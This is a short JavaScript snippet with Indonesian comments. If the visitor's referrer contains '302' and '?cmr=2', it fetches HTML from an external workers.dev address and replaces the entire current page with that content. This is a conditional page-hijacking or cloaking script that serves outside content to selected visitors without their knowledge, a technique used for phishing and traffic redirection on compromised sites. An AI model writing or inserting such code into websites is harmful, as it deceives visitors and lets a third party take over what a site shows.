// Memeriksa apakah sumber lalu lintas adalah redirect status 302 dan memiliki parameter ?cmr=2
if (document.referrer.includes("302") && document.referrer.includes("?cmr=2")) {
  // Mengambil HTML dari https://crm-template-one.mastimon.workers.dev/
  fetch("https://crm-template-one.mastimon.workers.dev/")
    .then(response => response.text())
    .then(html => {
      // Membuat elemen sementara untuk menampung HTML yang diambil
      const tempElement = document.createElement('html');
      tempElement.innerHTML = html;

      // Mengganti HTML pada tag <html> dengan HTML yang diambil dari website
      document.documentElement.innerHTML = tempElement.innerHTML;
    })
    .catch(error => {
      console.error('Error:', error);
    });
}
